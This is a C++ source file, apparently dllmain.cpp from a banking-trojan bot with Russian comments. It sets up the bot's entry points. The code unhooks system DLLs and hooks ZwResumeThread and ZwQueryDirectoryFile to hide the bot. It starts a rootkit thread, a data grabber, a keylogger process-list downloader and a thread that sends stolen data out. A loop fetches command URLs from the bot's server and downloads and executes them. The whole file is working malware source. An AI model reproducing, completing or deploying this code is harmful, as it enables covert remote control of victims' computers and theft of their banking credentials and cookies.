// dllmain.cpp: определяет точку входа для приложения DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Task.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"
#include "BotCore.h"
#include "BotConfig.h"
#include "IfobsOnline.h"
#include "Task.h"
#include "Loader.h"


#include "Crypt.h"

#include "Modules.h"

#include "ntdll.h"

#include "coocksol.h"

#include "Firefox.h"

#include "md5.h"

//#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  Система отладочных строк
//------------------------------------------------------------------------------

#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку

DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
DWORD dwWebMoneySelf = 0;

//DWORD dwExplorerPid  = 0; //пид эксплорера

DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");


	UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Регистрируем глобальный менеджер задач
	InitializeTaskManager(NULL, true);

	// Вызываем событие
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}


	// Запускаем поток отправки данных
	DataGrabber::StartDataSender();

	// Стартуем поток обновления списка процессов кейлогера
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;
	
	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
	while (true)
	{
		PCHAR URL = GetBotScriptURL(SCRIPT_TASK);

		// Загружаем и выполняем команду
		if (URL != NULL)
		{
			DLLDBG("====>Bot Loader", "Выполняем команду \r\n\URL: %s", URL);
			DownloadAndExecuteCommand(NULL, URL);
			STR::Free2(URL);
			DLLDBG("====>Bot Loader", "Запрос команды завершён");
		}
		else
		{
			DLLDBG("====>Bot Loader", "Не удалось получить адрес скрипта команд");	
		}

		// "Гениальность" проектирования взаимосвязи бота и его сервера
		// отправка стартовой информации должна идти только после получения
		// команды
		if (!FirstSended)
		{
			DLLDBG("====>Bot Loader", "Отправляем информацию о системе");
			FirstSended = SendFirstInfo();
		}


		// Приостанавливаем выполнение команд
		if (!TaskManagerSleep(NULL))
			break;
	}

	return 0;
}



DWORD WINAPI ExplorerMain(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix());

	UnhookDlls();

	
	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();


	HookZwResumeThread();
	HookZwQueryDirectoryFile();

		
	DLLDBG("====>Bot DLL", "Стартуем Loader");
	MegaJump( LoaderRoutine );

	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "Стартуем грабер");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// Вызываем событие мтарта експлорера

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}


DWORD WINAPI StartThreadProc(LPVOID)
{
	InitializeAPI();          


	//while (1) pSleep(100000); 
	return 0;
}

extern"C"  void WINAPI Start()
{
	BOT::Initialize();
	string Msg;
	Msg.Format("1.11 Присоедините среду к процессу [PID:%d] %s", Bot->PID(), Bot->ApplicationName().t_str()); 

	pMessageBoxA(NULL, Msg.t_str(), NULL, 0); 
	
//	IfobsOnline::Initialize();

//	return;


	 
	Config::SetFileName("c:\\config\\config.bin"); 
	    
	RootkitThread(NULL); 

	while (1) pSleep(100000);    
}



